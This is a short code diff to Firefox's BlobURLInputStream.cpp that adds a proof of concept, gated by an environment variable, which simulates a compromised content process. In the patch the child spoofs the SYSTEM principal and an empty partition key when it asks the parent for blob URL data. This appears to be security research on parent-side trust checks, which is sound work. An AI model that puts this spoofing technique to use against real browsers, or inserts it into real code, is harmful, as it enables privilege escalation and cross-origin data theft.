@@ -1,0 +1,43 @@
+diff --git a/dom/file/uri/BlobURLInputStream.cpp b/dom/file/uri/BlobURLInputStream.cpp
+index a1c25b54..bf7576ec 100644
+--- a/dom/file/uri/BlobURLInputStream.cpp
++++ b/dom/file/uri/BlobURLInputStream.cpp
+@@ -5,6 +5,8 @@
+ #include "BlobURLInputStream.h"
+ 
+ #include "BlobURL.h"
++#include "nsContentUtils.h"
++#include "prenv.h"
+ #include "BlobURLChannel.h"
+ #include "BlobURLProtocolHandler.h"
+ #include "mozilla/ScopeExit.h"
+@@ -438,11 +440,27 @@ void BlobURLInputStream::RetrieveBlobData(const MutexAutoLock& aProofOfLock) {
+ 
+   cleanupOnEarlyExit.release();
+ 
++  // --- PoC: simulate a compromised content process -------------------------
++  // Only the three caller-supplied values change; the parent is untouched, so
++  // whatever it does next is entirely the parent's own logic.
++  nsCOMPtr<nsIPrincipal> pocTriggering = triggeringPrincipal;
++  nsCOMPtr<nsIPrincipal> pocLoading = loadingPrincipal;
++  nsAutoCString pocPartKey(NS_ConvertUTF16toUTF8(partKey));
++  if (PR_GetEnv("MOZ_POC_BLOB_SPOOF")) {
++    nsCOMPtr<nsIPrincipal> sysPrincipal = nsContentUtils::GetSystemPrincipal();
++    pocTriggering = sysPrincipal;
++    pocLoading = sysPrincipal;
++    pocPartKey.Truncate();
++    printf_stderr("[PoC] spoofing SYSTEM principal + empty partitionKey for %s\n",
++                  mBlobURLSpec.get());
++  }
++  // -------------------------------------------------------------------------
++
+   contentChild
+       ->SendBlobURLDataRequest(
+-          mBlobURLSpec, WrapNotNull(triggeringPrincipal), loadingPrincipal,
++          mBlobURLSpec, WrapNotNull(pocTriggering), pocLoading,
+           loadInfo->GetOriginAttributes(), loadInfo->GetInnerWindowID(),
+-          NS_ConvertUTF16toUTF8(partKey))
++          pocPartKey)
+       ->Then(
+           GetCurrentSerialEventTarget(), __func__,
+           [self](const BlobURLDataRequestResult& aResult) {
